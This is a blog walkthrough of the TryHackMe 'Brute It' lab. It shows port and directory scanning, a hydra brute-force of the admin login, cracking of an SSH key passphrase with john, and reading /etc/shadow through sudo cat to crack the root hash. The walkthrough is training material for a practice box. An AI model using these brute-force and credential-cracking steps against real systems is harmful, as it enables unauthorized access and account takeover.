---
title: TryHackMe Brute It
date: 2024-03-30 00:00:00 +0800
categories: [TryHackMe]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/e343e8b253b4efc14bf61236d457c923.jpg
---

Learn how to brute, hash cracking and escalate privileges in this box!

## **Reconnaissance**
---
Initially do the Nmap scan.

```bash
nmap -sC -sV -p- $IP --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:25 EDT
Nmap scan report for 10.10.34.122
Host is up (0.30s latency).
Not shown: 60790 closed tcp ports (conn-refused), 4743 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.75 seconds
```

## **Insights and To-TRY List**
---
OS: Ubuntu

TARGET IP: 10.10.34.122

80 → HTTP

- Apache httpd 2.4.29
- There is a login form
- There is a comment in the source code of the login page that says the username is admin
- Was able to brute force the login page using hydra
- Got the username and the password
- Exposed id_rsa key and it has been cracked using john the ripper.

22 → SSH

- OpenSSH 7.6p1
- john:rockinroll
- root:football

## **Enumeration**
---
### 80 HTTP

Viewing the page source code

![Desktop View](/assets/images/brute-it/default-page.png){: width="972" height="589" }

**Directory Busting**

```
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 30
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.122
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.34.122/admin/]
/server-status        (Status: 403) [Size: 277]
Progress: 62284 / 62285 (100.00%)

```

Visiting the /admin page

![Desktop View](/assets/images/brute-it/admin.png){: width="972" height="589" }

It is always important to inspect the page source code.

![Desktop View](/assets/images/brute-it/source-code.png){: width="972" height="589" }

We only have two ports exposed, and it is likely that SSH is password-protected as well. So, our only choice is to brute force the login page to gain an initial foothold.

Note that since we are brute-forcing an HTTP login page and it is most likely to be a POST request, we need to specify http-post-form as the type of service for Hydra to use.

![Desktop View](/assets/images/brute-it/name-attrib.png){: width="972" height="589" }

Plus, take note of the `name` attribute that specifies the name of an `input` element for username and password.

```bash
hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt 10.10.34.122 http-post-form '/admin/:user=^USER^&pass=^PASS^:Username of password invalid'
```
![Desktop View](/assets/images/brute-it/bruteforced.png){: width="972" height="589" }

```bash
[80][http-post-form] host: 10.10.44.25   login: admin   password: xavier
```

Login using the credentials we got.

![Desktop View](/assets/images/brute-it/login.png){: width="972" height="589" }

Get the id_rsa and crack it.

Convert the private key into a hash that can be cracked by the password cracking tool John the Ripper using ssh2john

```bash
ssh2john id_rsa > id_rsa_compatible.txt
```

```bash
john id_rsa_compatible.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![Desktop View](/assets/images/brute-it/john.png){: width="972" height="589" }


## **Gaining an Initial Foothold**
---

Log in via ssh. Do not forget to change the file permission for the private key before using it.

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa username@IP
```

Enter the passphrase that we got from bruteforcing the rsa key

![Desktop View](/assets/images/brute-it/passphrase.png){: width="972" height="589" }

> Do not forget to find the FLAGS
{: .prompt-danger }


## **Privilege Escalation**
---

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file. Fortunately, /bin/cat can be used by our current user with sudo privilege without any restrictions at all

![Desktop View](/assets/images/brute-it/sudo-l.png){: width="972" height="589" }

We can use gtfobin to see how we can leverage our sudo privilege

![Desktop View](/assets/images/brute-it/sudo-cat.png){: width="972" height="589" }

We can use cat to view the `shadow` and `passwd` file and add our own user to escalate our privilege to root.

```bash
sudo cat /etc/shadow
```

```bash
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

```bash
sudo cat /etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
thm:x:1000:1000:THM Room:/home/thm:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
john:x:1001:1001:john,,,:/home/john:/bin/bash
```

Copy the password and shadow file to your attacking machine and unshadow it.

```bash
 unshadow passwd.txt shadow.txt > unshadowed.txt
```

![Desktop View](/assets/images/brute-it/unshadow.png){: width="972" height="589" }

```bash
root:football:0:0:root:/root:/bin/bash
```

Switch to root user. Enter the password we’ve just bruteforce using john when prompted

```bash
su root
```

![Desktop View](/assets/images/brute-it/root.png){: width="972" height="589" }

> Do not forget to find the FLAGS
{: .prompt-danger }